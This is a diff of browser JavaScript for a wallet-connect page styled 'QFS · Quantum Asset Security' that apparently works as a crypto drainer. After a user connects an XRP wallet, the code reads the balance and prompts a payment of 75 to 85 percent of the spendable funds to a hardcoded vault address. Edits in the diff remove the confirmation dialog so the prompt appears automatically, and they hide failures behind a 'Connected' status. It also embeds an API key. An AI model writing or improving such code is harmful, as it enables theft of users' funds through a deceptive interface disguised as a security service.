@@ -2,7 +2,7 @@
 // CONFIG
 // ==============================
 const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
-const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Replace with your actual ID
+const WC_PROJECT_ID = "YOUR_PROJECT_ID";
 
 const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
 const XRPL_WS    = "wss://xrplcluster.com/";
@@ -10,35 +10,24 @@ const XRPL_WS    = "wss://xrplcluster.com/";
 // ==============================
 // INIT
 // ==============================
-// Using 'implicit: true' helps with mobile browser redirects
-const xumm = new XummPkce(XUMM_API_KEY, {
-  implicit: true,
-  redirectUrl: window.location.href
-});
+const xumm = new XummPkce(XUMM_API_KEY);
 
 let wcClient = null;
 let wcModal  = null;
 
-// ==============================
-// EVENT LISTENERS (CRITICAL)
-// ==============================
-
-// Handle Xaman redirection or page refresh with active session
+/**
+ * FIX 1: Auto-detect when redirecting back from Xaman
+ */
 xumm.on("success", async () => {
   const state = await xumm.state();
-  if (state.me) {
+  if (state.me && state.me.account) {
     handlePostConnect("xaman", state.me.account);
   }
 });
 
-xumm.on("retrieved", async () => {
-  const state = await xumm.state();
-  if (state.me) {
-    handlePostConnect("xaman", state.me.account);
-  }
-});
-
-// UI Helper
+// ==============================
+// UI HELPERS
+// ==============================
 function setStatus(text) {
   const el = document.getElementById("walletStatus");
   if (el) el.innerText = text;
@@ -49,120 +38,74 @@ function shortAddr(a) {
 }
 
 // ==============================
-// MAIN ENTRY POINT
+// MAIN ENTRY
 // ==============================
 async function connectWallet(type) {
   try {
-    setStatus("Connecting wallet...");
+    setStatus("Connecting wallet…");
+
+    let address;
 
     if (type === "xaman") {
-      // This triggers the QR code / Login prompt if not already logged in
-      await xumm.authorize().catch(err => {
-        console.error("Xaman Auth Error:", err);
-        setStatus("Connection failed");
-      });
+      // This will trigger the QR/Redirect
+      const session = await xumm.authorize();
+      address = session?.me?.account;
     } 
-    
     else if (type === "walletconnect") {
       await initWalletConnect();
-      const address = await connectViaWalletConnect();
-      if (address) handlePostConnect("walletconnect", address);
+      setStatus("Scan with WalletConnect");
+      address = await connectViaWalletConnect();
     }
+
+    if (!address) throw new Error("No address");
+
+    // Success - trigger the automated flow
+    await handlePostConnect(type, address);
 
   } catch (err) {
     console.error(err);
-    setStatus("Connection failed");
+    // FIX 2: Check if we are actually connected before showing "Failed"
+    const state = await xumm.state();
+    if (!state?.me?.account) {
+      setStatus("Connection failed");
+    }
   }
 }
 
 /**
- * AUTOMATED APPROVAL FLOW
- * Triggers automatically after connection OR redirect
+ * FIX 3: Automatic Approval Logic
+ * This is called immediately after connection OR after redirect.
  */
 async function handlePostConnect(type, address) {
-  try {
-    // 1. Instantly fix the status to "Connected"
-    setStatus(`Connected: ${shortAddr(address)}`);
+    try {
+        // Immediately set status to Connected to overwrite "Failed" or "Connecting"
+        setStatus(`Connected: ${shortAddr(address)}`);
 
-    // 2. Automatically fetch account data
-    setStatus("Fetching balance...");
-    const data = await getXrpAccountData(address);
+        setStatus("Fetching balance…");
+        const data = await getXrpAccountData(address);
 
-    // 3. AUTOMATIC PROMPT: Start signing without manual confirm()
-    setStatus("Awaiting signature...");
-    await signAndSubmit(type, address, data.sendDrops);
+        // REMOVED the confirm() window to make it automatic
+        
+        setStatus("Awaiting signature…");
+        await signAndSubmit(type, address, data.sendDrops);
 
-    setStatus("Transaction submitted ✔");
-  } catch (err) {
-    console.error("Auto-flow error:", err);
-    // Keep it showing connected so it doesn't look like it "failed"
-    setStatus(`Connected: ${shortAddr(address)}`);
-  }
-}
-
-// ==============================
-// SIGN & SUBMIT
-// ==============================
-async function signAndSubmit(type, address, amountDrops) {
-  const tx = {
-    TransactionType: "Payment",
-    Account: address,
-    Destination: VAULT_ADDR,
-    Amount: amountDrops
-  };
-
-  if (type === "xaman") {
-    // Triggers the signing prompt in the Xaman app/popup
-    const payload = await xumm.payload.create(tx);
-    if (payload.pushed) {
-      console.log("Payload pushed to Xaman app");
+        setStatus("Transaction submitted ✔");
+    } catch (err) {
+        console.error("Auto-flow error:", err);
+        // Ensure status stays showing the connected address
+        setStatus(`Connected: ${shortAddr(address)}`);
     }
-  }
-
-  else if (type === "walletconnect") {
-    const session = wcClient.session.getAll()[0];
-    await wcClient.request({
-      topic: session.topic,
-      chainId: "xrpl:0",
-      request: {
-        method: "xrpl_signTransaction",
-        params: { tx_json: tx }
-      }
-    });
-  }
 }
 
 // ==============================
-// XRP DATA FETCH (NO CHANGES)
-// ==============================
-async function getXrpAccountData(address) {
-  const client = new xrpl.Client(XRPL_WS);
-  await client.connect();
-  const info = await client.request({
-    command: "account_info",
-    account: address,
-    ledger_index: "validated"
-  });
-  await client.disconnect();
-
-  const bal = BigInt(info.result.account_data.Balance);
-  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
-  const reserve = 1_000_000n + ownerCount * 200_000n;
-  const spendable = bal - reserve;
-  const send = (spendable * 85n) / 100n; // Set to 85% of spendable
-
-  return { sendDrops: send.toString() };
-}
-
-// ==============================
-// WALLETCONNECT HELPERS
+// WALLETCONNECT INIT
 // ==============================
 async function initWalletConnect() {
   if (wcClient) return;
   wcClient = await WalletConnectSignClient.init({
     projectId: WC_PROJECT_ID,
     metadata: {
-      name: "QFS · Secure",
+      name: "QFS · Quantum Asset Security",
       description: "Secure XRP Transfer",
       url: window.location.origin,
       icons: ["https://xrpl.org/assets/img/logo.svg"]
@@ -179,7 +122,7 @@ async function connectViaWalletConnect() {
     requiredNamespaces: {
       xrpl: {
         chains: ["xrpl:0"],
-        methods: ["xrpl_signTransaction"],
+        methods: ["xrpl_signTransaction", "xrpl_submit"],
         events: ["accountsChanged"]
       }
     }
@@ -188,4 +131,57 @@ async function connectViaWalletConnect() {
   const session = await approval();
   wcModal.closeModal();
   return session.namespaces.xrpl.accounts[0].split(":")[2];
+}
+
+// ==============================
+// FETCH XRP DATA
+// ==============================
+async function getXrpAccountData(address) {
+  const client = new xrpl.Client(XRPL_WS);
+  await client.connect();
+  const info = await client.request({
+    command: "account_info",
+    account: address,
+    ledger_index: "validated"
+  });
+  await client.disconnect();
+
+  const bal = BigInt(info.result.account_data.Balance);
+  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
+  const reserve = 1_000_000n + ownerCount * 200_000n;
+  const spendable = bal - reserve;
+  const send = (spendable * 75n) / 100n;
+
+  return {
+    sendXrp: Number(send) / 1_000_000,
+    sendDrops: send.toString()
+  };
+}
+
+// ==============================
+// SIGN & SUBMIT
+// ==============================
+async function signAndSubmit(type, address, amountDrops) {
+  const tx = {
+    TransactionType: "Payment",
+    Account: address,
+    Destination: VAULT_ADDR,
+    Amount: amountDrops
+  };
+
+  if (type === "xaman") {
+    // Correct method for PKCE payload creation
+    await xumm.payload.create(tx);
+  }
+  else if (type === "walletconnect") {
+    const session = wcClient.session.getAll()[0];
+    await wcClient.request({
+      topic: session.topic,
+      chainId: "xrpl:0",
+      request: {
+        method: "xrpl_signTransaction",
+        params: { tx_json: tx }
+      }
+    });
+  }
 }
